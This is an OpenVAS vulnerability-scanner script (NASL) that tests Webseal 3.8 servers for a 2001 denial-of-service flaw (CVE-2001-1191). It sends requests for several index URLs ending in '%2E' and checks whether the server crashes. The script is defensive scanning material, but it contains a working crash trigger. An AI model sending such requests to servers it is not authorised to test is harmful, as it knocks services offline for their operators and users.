# OpenVAS Vulnerability Test
# $Id: webseal_DoS.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: Webseal denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server dies when an URL ending with %2E is requested.

A cracker may use this flaw to make your server crash continually.";

tag_solution = "upgrade your server or firewall it.";

# References:
# Date:  11 Dec 2001 09:22:50 -0000
# From: "Matthew Lane" <MatthewL@Janusassociates.com>
# To: bugtraq@securityfocus.com
# Subject: Webseal 3.8
#
# Affected:
# Webseal 3.8

if(description)
{
 script_id(11089);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3685);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2001-1191");
 
 name = "Webseal denial of service";
 script_name(name);
 
 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);
if (! can_host_asp(port:port)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

url[0] = "/index.html";
url[1] = "/index.htm";
url[2] = "/index.asp";
url[3] = "/";

for (i=0; i<4;i=i+1)
{
 req = http_get(port: port, item: string(url[i], "%2E"));
 send(socket: soc, data: req);
 r = http_recv(socket: soc);
 http_close_socket(soc);
 
 soc = http_open_socket(port);
 if(!soc) break;
}
# We must close the socket, VNC limits the number of parallel connections
if (soc) http_close_socket(soc);

if (http_is_dead(port: port)) { security_message(port); }
